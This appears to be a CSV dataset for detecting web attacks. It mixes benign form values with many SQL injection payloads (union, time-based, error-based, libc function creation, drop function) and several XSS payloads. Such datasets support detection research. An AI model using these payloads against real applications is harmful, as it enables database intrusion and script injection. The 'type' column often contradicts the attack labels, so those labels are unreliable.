Text,attack_type,Label,type
"caada de los ingleses, 117,",norm,0,normal
"-1368)) union all select 1310,1310,1310,1310,1310#",sqli,1,sql
rakin,norm,0,normal
6803792379658242,norm,0,normal
15,norm,0,normal
c/ caridad s/n,norm,0,normal
calle codigo correspondencia oficial correos-telegrafos s/n 9a,norm,0,normal
f5-c21s7,norm,0,normal
-7242' or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and 'kfff'='kfff,sqli,1,sql
"1)));select benchmark(5000000,md5(0x714e4153))#",sqli,1,sql
1' where 6003=6003 rlike (select (case when (7689=7689) then 1 else 0x28 end))--,sqli,1,sql
2542,norm,0,normal
anchia,norm,0,normal
7370150636603952,norm,0,normal
69634179t,norm,0,normal
"1"" where 8234=8234;select (case when (4291=6937) then 4291 else 4291*(select 4291 from mysql.db) end)#",sqli,1,sql
-6512'+(select 'zdjx' where 5454=5454 order by 1--,sqli,1,sql
"""javascript:alert(2)"">",xss,2,xss
1' or (select * from (select(sleep(5)))ydpu) and 'ejdk' like 'ejdk,sqli,1,sql
girones,norm,0,normal
gras egovil,norm,0,normal
5854367786451207,norm,0,normal
"data:text/html;charset=utf-7;base64,ij48l3rpdgxlpjxzy3jpchq+ywxlcnqomtmznyk8l3njcmlwdd4=",xss,2,sql
47761an0i59r,norm,0,normal
1) order by 1#,sqli,1,normal
"1 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)",sqli,1,sql
1' where 2673=2673;select (case when (2716=8138) then 2716 else 2716*(select 2716 from mysql.db) end)#,sqli,1,sql
sweeney,norm,0,normal
"-4586 union all select 2068,2068,2068,2068--",sqli,1,sql
howe1,norm,0,normal
"1') where 8255=8255 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
"c/ clarin, 117",norm,0,normal
mirambel,norm,0,normal
8436,norm,0,normal
"1',(select (case when (9443=9443) then sleep(5) else 9443*(select 9443 from information_schema.character_sets) end))",sqli,1,sql
-pantufla,norm,0,normal
maliski,norm,0,normal
arana,norm,0,normal
gomero gallardo,norm,0,normal
pontigo,norm,0,normal
8097565444470307,norm,0,normal
"1' or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)",sqli,1,sql
pridiliano,norm,0,normal
meinrad,norm,0,normal
27306256n,norm,0,normal
"1%' and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
"1)));select count(*) from generate_series(1,5000000) and (((1321=1321",sqli,1,sql
"rio tajua 19,",norm,0,normal
fanny,norm,0,normal
wakao@sitienesunawebtienesunnegocio.as,norm,0,normal
"1"";select count(*) from generate_series(1,5000000)--",sqli,1,sql
"-3068%"")) union all select 6597,6597,6597,6597,6597,6597,6597,6597--",sqli,1,sql
"boyero 165, 13?f",norm,0,normal
carablanca,norm,0,normal
"-9152"")) as avga where 3825=3825 order by 1#",sqli,1,normal
09085572c,norm,0,normal
blava,norm,0,normal
takakura@cenitsoria.sb,norm,0,normal
vargueo,norm,0,normal
1864402022200871,norm,0,normal
carrera,norm,0,normal
desnuda,norm,0,normal
05619,norm,0,normal
"1'));iif(5571=4947,1,1/0)",sqli,1,sql
9598787825284298,norm,0,normal
glatzeder.karr@lamejorplaya.so,norm,0,normal
"1"")));select pg_sleep(5) and (((""nvuv"" like ""nvuv",sqli,1,sql
4970113242543246,norm,0,normal
-1<script>document.cookie=true;//--></script>,xss,2,xss
"1') or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ('cpfn' like 'cpfn",sqli,1,sql
0203613587476688,norm,0,normal
strom.mahieuy4@karldeux.ac,norm,0,normal
wyle@designworld.us,norm,0,normal
gomecello,norm,0,normal
thorndik9,norm,0,normal
i2cit6d4r,norm,0,normal
"-8136') union all select 1324,1324,1324,1324#",sqli,1,sql
4809909158427521,norm,0,normal
san cebrin de mud,norm,0,normal
"c/ muntaner, 21",norm,0,normal
"1%'));select * from generate_series(5846,5846,case when (5846=5227) then 1 else 0 end) limit 1--",sqli,1,sql
"calle la caldera, 76 11-c",norm,0,normal
balsame@provider.com.mg,norm,0,normal
"1;select count(*) from generate_series(1,5000000)",sqli,1,sql
lauraine,norm,0,normal
1 and sleep(5)#,sqli,1,normal
85063049x,norm,0,normal
bu0ar4,norm,0,normal
-4572') union all select 3520--,sqli,1,sql
"-3955 where 7276=7276 union all select 7276,7276,7276,7276,7276,7276,7276,7276,7276--",sqli,1,sql
"1""));if(7899=7899) select 7899 else drop function zbbp--",sqli,1,sql
1446991809597037,norm,0,normal
75771832b,norm,0,normal
encap-irotar,norm,0,normal
3288111380573813,norm,0,normal
"1%'))) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ((('%'='",sqli,1,sql
"1""));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ((""rthl"" like ""rthl",sqli,1,sql
ulc0r81a,norm,0,normal
05140,norm,0,normal
kjell,norm,0,normal
ehrlich.selwyne@ebaz.ba,norm,0,normal
fernandez alvarado 78,norm,0,normal
9a7bl1,norm,0,normal
"1 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))-- sbvl",sqli,1,sql
78360419v,norm,0,normal
courtney_lovelle@quehaces.cy,norm,0,normal
"-7889"")) as oayf where 1765=1765 or 8571=8571--",sqli,1,sql
93128213v,norm,0,normal
"1"" and (1668=8054)*8054",sqli,1,normal
10739,norm,0,normal
"1"" and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ""mbas""=""mbas",sqli,1,sql
16522,norm,0,normal
1'+(select mfcd where 6757=6757 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))+',sqli,1,sql
9357275036779206,norm,0,normal
3245,norm,0,normal
"1) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (6986=6986",sqli,1,sql
nhat,norm,0,normal
1<script>prompt(999691)</script>,xss,2,xss
52943030c,norm,0,normal
78248698f,norm,0,normal
"calle carme karr, 65, 10a",norm,0,normal
"c/ alicante, 83,",norm,0,normal
6371,norm,0,normal
1)) waitfor delay '0:0:5' and ((1636=1636,sqli,1,normal
"-8943%') union all select 7710,7710#",sqli,1,sql
olmos de ojeda,norm,0,normal
tengroth@academiaversal.md,norm,0,normal
simhan,norm,0,normal
aventada,norm,0,normal
"1%') union all select null,null#",sqli,1,sql
"1"") or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (""xmrq""=""xmrq",sqli,1,normal
anatoly,norm,0,normal
"<img id=xss src=javascript:alert(""xss"")>",xss,2,xss
"1))) and 2388=benchmark(5000000,md5(0x6d457153))#",sqli,1,normal
"1%"")) or elt(6272=6272,sleep(5)) and ((""%""=""",sqli,1,normal
"1'))) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ((('yznn' like 'yznn",sqli,1,sql
1365,norm,0,normal
"vid y barrios, la",norm,0,normal
olav,norm,0,normal
-1876%') union all select 6463--,sqli,1,sql
rehenchida,norm,0,normal
"-9947""))) union all select 8765,8765,8765,8765,8765#",sqli,1,sql
portal tauler,norm,0,normal
23670,norm,0,normal
quismondo,norm,0,normal
3111906620815887,norm,0,normal
"1 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)# jcdh",sqli,1,normal
"1%"" and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
benalup-casas viejas,norm,0,normal
"1""))) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((""nevr"" like ""nevr",sqli,1,normal
01633578a,norm,0,normal
"-4865 where 1386=1386 union all select 1386,1386,1386,1386#",sqli,1,sql
"rio ter, 86, 5?g",norm,0,normal
write(1) autofocus><input autofocus>,xss,2,normal
pfeilsch,norm,0,normal
37217,norm,0,normal
"1))) union all select null,null,null,null,null,null,null,null--",sqli,1,sql
6653,norm,0,normal
"1') as rqfq where 7077=7077 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
c/ doctor luis calandre 44,norm,0,normal
5254,norm,0,normal
20542773r,norm,0,normal
"-1372%'))) union all select 8403,8403,8403,8403#",sqli,1,sql
entolar,norm,0,normal
"1"";waitfor delay '0:0:5'",sqli,1,sql
4140359172053437,norm,0,normal
"1"";select (case when (8618=8706) then 8618 else 8618*(select 8618 from mysql.db) end)#",sqli,1,sql
6689689469452036,norm,0,normal
"1%"");if(9953=4347) select 9953 else drop function ocau--",sqli,1,sql
"1)) as qzmg where 4344=4344 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--",sqli,1,sql
25793872q,norm,0,normal
"1')));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('mfib'='mfib",sqli,1,sql
"1') and make_set(8403=8403,8899) and ('ojag'='ojag",sqli,1,normal
"c/ concepcion alexandre 82,",norm,0,normal
64633352v,norm,0,normal
27,norm,0,normal
"1';select * from generate_series(7237,7237,case when (7237=9757) then 1 else 0 end) limit 1--",sqli,1,sql
sopista,norm,0,normal
"calle libertad, s/n",norm,0,normal
"1"") as rdvm where 6360=6360 and sleep(5)--",sqli,1,sql
32621,norm,0,normal
"1%')) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('%'='",sqli,1,normal
"-5174'))) or make_set(9515=7938,7938) and ((('ygee'='ygee",sqli,1,normal
1' in boolean mode) waitfor delay '0:0:5'--,sqli,1,sql
enedn,norm,0,normal
-3895') or 8645=5359--,sqli,1,sql
pawluszek segu,norm,0,normal
6343513594517926,norm,0,normal
-9644)) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((5616=5616,sqli,1,sql
31640,norm,0,normal
tubal,norm,0,normal
"1' or 8466=benchmark(5000000,md5(0x694a4745)) and 'eznq' like 'eznq",sqli,1,normal
siguemepol0o,norm,0,normal
"-1451%') union all select 7666,7666,7666#",sqli,1,sql
"1%"")) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ((""%""=""",sqli,1,sql
28191,norm,0,normal
"<img id=xss src='vbscript:msgbox(""xss"")'>",xss,2,normal
1') as wvvo where 4288=4288;select (case when (5009=1133) then 5009 else 5009*(select 5009 from information_schema.character_sets) end)#,sqli,1,sql
idelfonsa,norm,0,normal
16670,norm,0,normal
3002451726827839,norm,0,normal
"<iframe id=xss src=""javascript:alert('xss');""></iframe>",xss,2,xss
"aljaraque 196, 11d",norm,0,normal
sant vicen de torell,norm,0,normal
"calle camino getafe, 157,",norm,0,normal
-2402 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)-- szgq,sqli,1,sql
gina,norm,0,normal
20560,norm,0,normal
-9826 where 4103=4103 order by 1#,sqli,1,normal
5384858615812674,norm,0,normal
"-9054"") as rgyu where 3792=3792 order by 1--",sqli,1,sql
nakagome,norm,0,normal
co85863o,norm,0,normal
eva,norm,0,normal
28598,norm,0,normal
"1%"")) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((""%""=""",sqli,1,sql
reig jallo,norm,0,normal
1')) and 2006=2006,sqli,1,normal
palacios de riopisuerga,norm,0,normal
"1"")) union all select null--",sqli,1,sql
"1'+(select 'yzxc' where 5230=5230 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))))+'",sqli,1,sql
"tratado de niza, 96",norm,0,normal
1' in boolean mode) and (8610=2985)*2985#,sqli,1,normal
ku,norm,0,normal
-4389'))) or (1139=3499)*3499 and ((('qoch'='qoch,sqli,1,normal
3764289357675438,norm,0,normal
navaescurial,norm,0,normal
tonche meja,norm,0,normal
12361918q,norm,0,normal
25109956m,norm,0,normal
"primavera, 174",norm,0,normal
8i4,norm,0,normal
jengibre,norm,0,normal
lamentante,norm,0,normal
caf12n,norm,0,normal
operalo@canovash.vg,norm,0,normal
1';waitfor delay '0:0:5' and 'gsvt'='gsvt,sqli,1,sql
"1) where 6424=6424;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,1,sql
ciezar,norm,0,normal
"1))) union all select null,null,null,null,null,null,null,null,null,null--",sqli,1,sql
"1') as omtb where 1183=1183 and 8635=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
"1;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
"1%""));select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
09301966f,norm,0,normal
c944i6a,norm,0,normal
mathus,norm,0,normal
sienes,norm,0,normal
1' or sleep(5) and 'rpqn' like 'rpqn,sqli,1,normal
rosselot azcona,norm,0,normal
gupton,norm,0,normal
"1%')) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (('%'='",sqli,1,sql
45221,norm,0,normal
"1) as hlit where 4973=4973 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1,normal
felber@hiperespaa.ps,norm,0,normal
villar de la encina,norm,0,normal
"1%')) and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1,sql
"pasaje alcobendas s/n,",norm,0,normal
hiss@ajuntamentdebarcelona20.yu,norm,0,normal
"1"") as cxwd where 5800=5800 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
1' in boolean mode) union all select null--,sqli,1,sql
pericas espaulella,norm,0,normal
3051,norm,0,normal
"1' or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and 'yvzf'='yvzf",sqli,1,sql
"calle fomento, 197, 3b",norm,0,normal
aloguer,norm,0,normal
valido casademont,norm,0,normal
roncar,norm,0,normal
"1) union all select null,null,null,null,null,null,null,null,null--",sqli,1,sql
closa ortell,norm,0,normal
abbai,norm,0,normal
"1))) or 8466=benchmark(5000000,md5(0x694a4745)) and (((8671=8671",sqli,1,normal
"1"")) or (select * from (select(sleep(5)))ydpu) and ((""imlq"" like ""imlq",sqli,1,sql
1'));select pg_sleep(5) and (('enpn' like 'enpn,sqli,1,sql
1)) rlike sleep(5) and ((8773=8773,sqli,1,normal
19144,norm,0,normal
"1'||(select 'hbho' from dual where 7193=7193;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))||'",sqli,1,sql
"c/ gamos 5, 11-h",norm,0,normal
brau ganfornina,norm,0,normal
1');if(7899=7899) select 7899 else drop function zbbp--,sqli,1,sql
5100,norm,0,normal
eldredge,norm,0,normal
goda,norm,0,normal
"1"") or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and (""ngnd"" like ""ngnd",sqli,1,sql
-5774' where 3632=3632 or (3177=4222)*4222--,sqli,1,sql
"1 where 6169=6169 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",sqli,1,sql
tatje sopesens,norm,0,normal
1') and (1414=4775)*4775 and ('mlmw'='mlmw,sqli,1,normal
-9708' where 8150=8150 or 6872=6872--,sqli,1,sql
46324867s,norm,0,normal
"1' and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
caputo,norm,0,normal
"1"")) and (3020=3020)*6703 and ((""njdx"" like ""njdx",sqli,1,normal
amelio,norm,0,normal
3290,norm,0,normal
"1"")) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((""qyew""=""qyew",sqli,1,sql
-5470')) or (8459=8459)*4906 and (('oeam'='oeam,sqli,1,normal
soule terraza,norm,0,normal
"1%"") and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
"1"") as zjwu where 9963=9963 or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1,normal
1710045357867718,norm,0,normal
"1' in boolean mode);select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,1,sql
grigoriu matons,norm,0,normal
domnech mila,norm,0,normal
"1'+(select 'ngdk' where 7264=7264 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))))+'",sqli,1,sql
-9875') or (8459=8459)*4906 and ('mrxw'='mrxw,sqli,1,normal
ninn,norm,0,normal
55950989q,norm,0,normal
indemira,norm,0,normal
1))) and (6148=3343)*3343 and (((3271=3271,sqli,1,normal
"1'||(select 'fwph' where 3791=3791;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
ti7o,norm,0,normal
capi8081a,norm,0,normal
pozuelo de calatrava,norm,0,normal
"1))) union all select null,null,null--",sqli,1,sql
1938425917633091,norm,0,normal
"1"") as zhlf where 4119=4119 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
"1%' union all select null,null,null--",sqli,1,sql
"1'+(select lhho where 7579=7579 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1,sql
1') or (select * from (select(sleep(5)))ydpu) and ('zaes'='zaes,sqli,1,sql
89910635r,norm,0,normal
1));select (case when (6002=9048) then 6002 else 6002*(select 6002 from mysql.db) end)#,sqli,1,sql
genet,norm,0,normal
"arrasate 130,",norm,0,normal
37i0440ilo,norm,0,normal
"1"" where 9014=9014 and 6969=(select 6969 from pg_sleep(5))--",sqli,1,sql
write(1) autofocus>,xss,2,normal
4646925880970082,norm,0,normal
agam1,norm,0,normal
sabu35so,norm,0,normal
celik-regan@turinga.sb,norm,0,normal
"1'+(select xlvq where 7470=7470 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3))+'",sqli,1,sql
49317901j,norm,0,normal
<script>alert(1);</script>,xss,2,xss
65782684q,norm,0,normal
tyner,norm,0,normal
1'))) rlike (select (case when (4076=4881) then 1 else 0x28 end)) and ((('grzs'='grzs,sqli,1,sql
"1 where 9752=9752;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
"1"" and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1,sql
1%'))) and (select * from (select(sleep(5)))gcrr)#,sqli,1,sql
"calle nueve, 190",norm,0,normal
13421536r,norm,0,normal
bentos campins,norm,0,normal
c39ine8ra,norm,0,normal
albuminmetro,norm,0,normal
"1"" where 5062=5062;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
trebaol@arroyomolinos-madrid.gq,norm,0,normal
"1 where 7072=7072 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--",sqli,1,sql
"-8544%"" or 6872=6872 and ""%""=""",sqli,1,normal
korpela,norm,0,normal
garde3@gay-tantra.kw,norm,0,normal
fedra,norm,0,normal
notley,norm,0,normal
1' in boolean mode);select (case when (1812=2446) then 1812 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
imtaz,norm,0,normal
kaile,norm,0,normal
63188831b,norm,0,normal
rougerie@cincocolores.sd,norm,0,normal
9061531800144737,norm,0,normal
sant lloren savall,norm,0,normal
"el caaveral 130, 5-f",norm,0,normal
"corredoira dos cornos, 175 4-c",norm,0,normal
1' or sleep(5)#,sqli,1,normal
1%') and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ('%'=',sqli,1,sql
"-9860) where 8743=8743 union all select 8743,8743,8743,8743,8743,8743,8743--",sqli,1,sql
tufts3@joll.rs,norm,0,normal
aldehuela del codonal,norm,0,normal
6748546919009265,norm,0,normal
6219323796056833,norm,0,normal
06378,norm,0,normal
"-9697) union all select 3052,3052,3052,3052,3052,3052,3052,3052,3052--",sqli,1,sql
26133,norm,0,normal
"-4015'||(select 'qeqv' from dual where 1437=1437 union all select 1437,1437,1437,1437,1437,1437,1437,1437,1437#",sqli,1,sql
5698239787045859,norm,0,normal
"-3633') where 3513=3513 union all select 3513,3513,3513,3513,3513,3513,3513,3513,3513,3513#",sqli,1,sql
"1""))) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (((""bizm""=""bizm",sqli,1,sql
"1') and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('rspz'='rspz",sqli,1,sql
"1'||(select 'gopc' where 7386=7386 and make_set(9375=7963,7963))||'",sqli,1,sql
25748,norm,0,normal
"1'+(select mcfb where 4050=4050 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3))+'",sqli,1,sql
1' rlike sleep(5) and 'ojqz' like 'ojqz,sqli,1,normal
"banquilla, 171,",norm,0,normal
0367766571989021,norm,0,normal
"1'+(select aahc where 5436=5436 and 3824=benchmark(5000000,md5(0x76555642)))+'",sqli,1,sql
cambil,norm,0,normal
malva,norm,0,normal
"1'||(select 'odud' from dual where 2468=2468 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
kinderman,norm,0,normal
undus de lerda,norm,0,normal
inoportunamente,norm,0,normal
atanaspulos,norm,0,normal
tennant4,norm,0,normal
calabazas de fuentiduea,norm,0,normal
8641,norm,0,normal
1') and 8594=(select 8594 from pg_sleep(5))--,sqli,1,sql
"-7725%')) union all select 4559,4559,4559,4559,4559,4559,4559,4559,4559--",sqli,1,sql
vitola@23horas.ad,norm,0,normal
zarratn,norm,0,normal
9139561296743472,norm,0,normal
"c/ artazuria, 43 10?e",norm,0,normal
6200,norm,0,normal
ha6agar,norm,0,normal
cigudosa,norm,0,normal
numeradora,norm,0,normal
05230,norm,0,normal
"1"") where 6255=6255 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",sqli,1,sql
acopetado,norm,0,normal
"-3626%"") or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (""%""=""",sqli,1,sql
levac,norm,0,normal
hbil,norm,0,normal
psklib,norm,0,normal
"-3862)) as vqtl where 9629=9629 union all select 9629,9629,9629,9629,9629--",sqli,1,sql
"1"" or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ""oyou""=""oyou",sqli,1,sql
6u2n8a,norm,0,normal
liew,norm,0,normal
snelgrov,norm,0,normal
1')) as sjzf where 9997=9997 and 4193=5408,sqli,1,normal
1%')) and 8594=(select 8594 from pg_sleep(5))--,sqli,1,sql
shukuri@velaconsultores.nl,norm,0,normal
"-1218' union all select 2663,2663,2663,2663--",sqli,1,sql
"1') where 4092=4092 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
3328,norm,0,normal
"silo 179, 12?b",norm,0,normal
"concordia, 102,",norm,0,normal
"1';create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and 'hhrw' like 'hhrw",sqli,1,sql
heraclio,norm,0,normal
2793,norm,0,normal
"1 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
"1"") or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (""zzkc""=""zzkc",sqli,1,sql
1943374801106050,norm,0,normal
91624121x,norm,0,normal
1'+(select aqhj where 4419=4419;waitfor delay '0:0:5'--,sqli,1,sql
bolkan@directoriogratuito.int,norm,0,normal
"1%""))) union all select null,null#",sqli,1,sql
1'));select case when 7717=7717 then 1 else null end--,sqli,1,sql
"-4721') or elt(4378=5165,5165) and ('fufn'='fufn",sqli,1,normal
-1730' or 8571=8571--,sqli,1,sql
62si27t8ico,norm,0,normal
bea,norm,0,normal
equiparar,norm,0,normal
ricardo,norm,0,normal
"santa clara, 111, 4?h",norm,0,normal
saladich bar,norm,0,normal
fredman6@cor-jet.to,norm,0,normal
gimnez toneu,norm,0,normal
valina,norm,0,normal
didier,norm,0,normal
steinfeld@multireform.sg,norm,0,normal
tordelrbano,norm,0,normal
51,norm,0,normal
1'+(select 'stsu' where 2386=2386 or sleep(5)#,sqli,1,sql
18l4et2ro,norm,0,normal
-4758%')) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (('%'=',sqli,1,sql
merendero,norm,0,normal
"1%"")) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ((""%""=""",sqli,1,sql
marc curull,norm,0,normal
h46a00o,norm,0,normal
baxevanos@clubdeviaje.fk,norm,0,normal
reaves-phillips@baybay.tm,norm,0,normal
santa cruz de la salceda,norm,0,normal
tainsy@jaxiaabogadosyeconomistas.je,norm,0,normal
"1%"") or 6793=(select 6793 from pg_sleep(5)) and (""%""=""",sqli,1,sql
10459,norm,0,normal
geir,norm,0,normal
"1"") as fkco where 8877=8877 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",sqli,1,sql
5012,norm,0,normal
8173502713249650,norm,0,normal
sibila,norm,0,normal
1')) and (select * from (select(sleep(5)))gcrr)#,sqli,1,sql
camio do verme 112 11a,norm,0,normal
colomer mars,norm,0,normal
4542,norm,0,normal
7311,norm,0,normal
kunecke,norm,0,normal
7ons15804d04en2e,norm,0,normal
"1) as bhdj where 4472=4472;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
57584234p,norm,0,normal
amn,norm,0,normal
